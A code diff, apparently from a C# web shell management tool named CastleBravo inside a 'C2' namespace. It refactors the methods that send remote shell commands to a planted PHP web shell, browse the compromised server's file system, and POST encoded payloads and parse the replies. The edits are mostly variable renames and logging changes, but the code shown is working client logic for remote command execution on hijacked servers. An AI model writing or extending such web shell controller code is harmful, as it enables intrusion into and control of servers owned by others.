@@ -35,16 +35,14 @@ namespace C2.Business.CastleBravo.WebShellTool
 
         public Tuple<string, string> Excute(string root, string command)
         {
-            sb.AppendLine("Shell:" + command);
-
             //需要先判断是什么系统
             bool isLinux = root.StartsWith("/");
-            string shellCmd = isLinux ? "/bin/sh" : "cmd";
+            string shellEnv = isLinux ? "/bin/sh" : "cmd";
             string template = isLinux ? "cd \"{0}\";{1};echo [S];pwd;echo [E]" : "cd /d \"{0}\"&{1}&echo [S]&cd&echo [E]";
             
             string remoteCmd = string.Format(template, root, command);
 
-            string[] ret = PHPShell(shellCmd, remoteCmd).Split("[S]");
+            string[] ret = PHPShell(shellEnv, remoteCmd).Split("[S]");
 
             try
             {
@@ -66,32 +64,32 @@ namespace C2.Business.CastleBravo.WebShellTool
 
         public Tuple<string, List<WSFile>, List<string>> PathBrowser(List<string> paths)
         {
-            List<WSFile> pathFiles = new List<WSFile>();
-            List<string> broPaths = new List<string>();
+            List<WSFile> children = new List<WSFile>();
+            List<string> brothers = new List<string>();
 
             if (paths.Count == 0 || string.IsNullOrEmpty(paths[0]))
-                return Tuple.Create(string.Empty, pathFiles, broPaths);
+                return Tuple.Create(string.Empty, children, brothers);
 
             string root = paths[0];
 
             //broPath仅针对window文件系统，内容为c: d: e:
             if (paths.Count == 2 && paths[1].Contains(":"))
-                broPaths = paths[1].Split(':').ToList();
+                brothers = paths[1].Split(':').ToList();
 
             string ret = PHPReadDict(root);
             foreach (string line in ret.Split('\n'))
             {
-                string[] itemInfo = line.Split('\t');
-                if (itemInfo.Length < 4 || itemInfo[0].IsNullOrEmpty() || itemInfo[0] == "./" || itemInfo[0] == "../")
+                string[] info = line.Split('\t');
+                if (info.Length < 4 || info[0].IsNullOrEmpty() || info[0] == "./" || info[0] == "../")
                     continue;
 
-                pathFiles.Add(new WSFile(itemInfo[0].EndsWith("/") ? WebShellFileType.Directory : WebShellFileType.File,
-                                         itemInfo[0].TrimEnd('/'),
-                                         itemInfo[1],
-                                         itemInfo[2],
-                                         itemInfo[3]));
+                children.Add(new WSFile(info[0].EndsWith("/") ? WebShellFileType.Directory : WebShellFileType.File,
+                                        info[0].TrimEnd('/'),
+                                        info[1],
+                                        info[2],
+                                        info[3]));
             }
-            return Tuple.Create(root, pathFiles, broPaths);
+            return Tuple.Create(root, children, brothers);
         }
         public string PHPInfo()
         {
@@ -135,29 +133,31 @@ namespace C2.Business.CastleBravo.WebShellTool
                 clientSetting.PARAM2,
                 Encode(command));
 
-            sb.AppendLine(payload);
+            sb.AppendLine("Remote Command:" + command)
+              .AppendLine(payload);
 
             return Post(payload);
         }
 
         private string Post(string payload)
         {    
-            string rspString = string.Empty;
+            string response = string.Empty;
             try
             {
-                byte[] rspBytes = new byte[0];
+                byte[] bytes = Encoding.Default.GetBytes(payload);
                 using (GuarderUtil.WaitCursor)
                     // TODO: 测试时发现webclient必须每次new一个新的才行, 按道理不应该
-                    rspBytes = WebClientEx.Create().UploadData(url, "POST", Encoding.Default.GetBytes(payload));
+                    bytes = WebClientEx.Create()
+                                       .UploadData(url, "POST", bytes);
 
-                rspString = Encoding.Default.GetString(rspBytes); 
+                response = Encoding.Default.GetString(bytes); 
             }
             catch (Exception ex)
             {
                 sb.AppendLine(ex.Message);
             }
 
-            return MidStrEx(rspString, clientSetting.SPL, clientSetting.SPR);
+            return MidStrEx(response, clientSetting.SPL, clientSetting.SPR);
         }
 
         private string MidStrEx(string sourse, string spl, string spr)
